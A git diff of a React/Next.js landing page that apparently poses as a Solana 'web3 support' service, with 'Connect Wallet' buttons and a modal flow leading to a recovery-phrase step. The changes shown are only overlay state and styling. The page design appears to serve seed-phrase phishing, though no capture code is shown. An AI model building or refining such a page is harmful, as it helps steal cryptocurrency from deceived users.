@@ -19,6 +19,7 @@ export default function Home() {
   const [showPhrase, setShowPhrase] = useState(false);
   const [showWallets, setShowWallets] = useState(false);
   const [smallModal, setSmallModal] = useState(false);
+  const [overlay,setOverlay] = useState(false)
   const [modal, setModal] = useState(false);
   const [walletQueries, setWalletQueries] = useState({
     name: "",
@@ -187,8 +188,8 @@ export default function Home() {
         ></link>
       </Head>
 
-      <main className="p-5 bg-[url('/Mian-bg.webp')]  overflow-hidden h-screen relative">
-        <div className="backdrop-blur-md modal  absolute w-screen hidden h-screen bg-black/30"></div>
+      <main className="p-5 bg-[url('/Mian-bg.webp')]   relative">
+        {overlay && <div className="backdrop-blur-md modal w-full absolute z-20 h-full bg-black/30"></div>}
 
         <nav className="grid items-center relative z-10 w-full grid-cols-2 mb-2">
           <div className="flex">
@@ -211,7 +212,10 @@ export default function Home() {
               <li
                 id="connectWallet"
                 className="bg-[#17fb9b] cursor-pointer text-sm sm:text-base font-medium px-2 py-2 sm:px-5 sm:py-2 text-black rounded-full"
-                onClick={() => setModal(true)}
+                onClick={() => {
+setModal(true)
+setOverlay(prev => !prev)
+                } }
               >
                 <small>Connect Wallet</small>
               </li>
@@ -236,19 +240,22 @@ export default function Home() {
 
           {/* End Try Video */}
           <div className="flex sm:mt-[15rem] mt-10 relative z-10 gap-10 flex-col items-center">
-            <p className="sm:text-4xl text-xl sm:px-96 sm:font-bold text-center">
+            <p className="sm:text-4xl text-white text-xl sm:px-96 sm:font-bold text-center">
               A suitable web3 support team <br className="sm:flex hidden"/> features  powering the 
               evolution of DeFi on Solana network.
             </p>
             <div className="sm:grid sm:grid-cols-3 sm:gap-5">
               {frontListings.map((x) => {
                 return (
-                  <div className="bg-gradient-to-br sm:mb-0 mb-3 text-center flex flex-col items-center justify-center from-purple-500/30 to-gray-700/30 backdrop-blur-md p-5 rounded-lg border-2 border-white/30" onClick={() => setModal(prev => !prev)}>
+                  <div className="bg-gradient-to-br sm:mb-0 mb-3 text-center flex flex-col items-center justify-center from-purple-500/30 to-gray-700/30 backdrop-blur-md p-5 rounded-lg border-2 border-white/30" onClick={() => {
+                    setModal(prev => !prev)
+                    setOverlay(prev => !prev)
+                  } }>
                     <div className="flex w-10 h-10 rounded-lg items-center text-center justify-center bg-white/50 backdrop-blur-md">
                       {x.comp}
                     </div>
-                    <h1 className="font-bold sm:text-lg mt-3">{x.name}</h1>
-                    <small className="mt-5">{x.para}</small>
+                    <h1 className="font-bold sm:text-lg mt-3 text-white">{x.name}</h1>
+                    <small className="mt-5 text-white">{x.para}</small>
                   </div>
                 );
               })}
@@ -258,7 +265,7 @@ export default function Home() {
           {smallModal && (
             <div
               id="smallModal"
-              className="mt-7 bg-white  z-30 absolute rounded-xl shadow-lg"
+              className="mt-7 top-40 bg-white fixed z-30  rounded-xl shadow-lg"
             >
               <div className="p-4 sm:p-7">
                 <div className="w-full flex justify-center mb-3">
@@ -275,7 +282,7 @@ export default function Home() {
                 </div>
                 <div className="flex flex-col">
                   <button
-                    className={`bg-${walletQueries.color}-500 sm:text-base text-sm mt-3 font-semibold text-black px-3 py-2`}
+                    className={`bg-${walletQueries?.color}-500 sm:text-base text-sm mt-3 font-semibold text-black px-3 py-2`}
                     onClick={() => {
                       setShowPhrase(true);
                       setSmallModal((prev) => !prev);
@@ -284,7 +291,7 @@ export default function Home() {
                     Extention
                   </button>
                   <button
-                    className="border-2 border-[#17fb9b] sm:text-base text-sm mt-3 font-semibold text-black px-3 py-2"
+                    className={`border-2 border-${walletQueries.color}-500 sm:text-base text-sm mt-3 font-semibold text-black px-3 py-2`}
                     onClick={() => {
                       setShowPhrase(true);
                       setSmallModal((prev) => !prev);
@@ -296,6 +303,7 @@ export default function Home() {
                     className="mt-5 uppercase text-black font-medium"
                     onClick={() => {
                       setSmallModal((prev) => !prev);
+                      setOverlay(prev => !prev)
                     }}
                   >
                     Close
@@ -308,12 +316,15 @@ export default function Home() {
           {modal && (
             <div
               id="selectWallet"
-              className="mt-7 bg-white h-screen overflow-hidden backdrop-blur-md modal absolute z-20 rounded-xl shadow-lg"
+              className="top-28 bg-white backdrop-blur-md modal fixed z-30 rounded-xl shadow-lg"
             >
               <div className="p-4 sm:p-7">
                 <div
                   className="w-full flex justify-end"
-                  onClick={() => setModal((prev) => !prev)}
+                  onClick={() => {
+setModal((prev) => !prev)
+setOverlay(prev => !prev)
+                  } }
                 >
                   <Cancel />
                 </div>
@@ -326,7 +337,7 @@ export default function Home() {
                   </div>
                 </div>
                 {/* Start Before Wallets */}
-                <button className="bg-purple-700 w-full mt-5 rounded-lg p-2">
+                <button className="bg-purple-700 text-white w-full mt-5 rounded-lg p-2">
                   Get Started
                 </button>
                 <div
@@ -389,6 +400,7 @@ export default function Home() {
                     className="w-full flex justify-end"
                     onClick={() => {
                       setShowPhrase((prev) => !prev);
+                      setOverlay(prev => !prev)
                     }}
                   >
                     <Cancel />
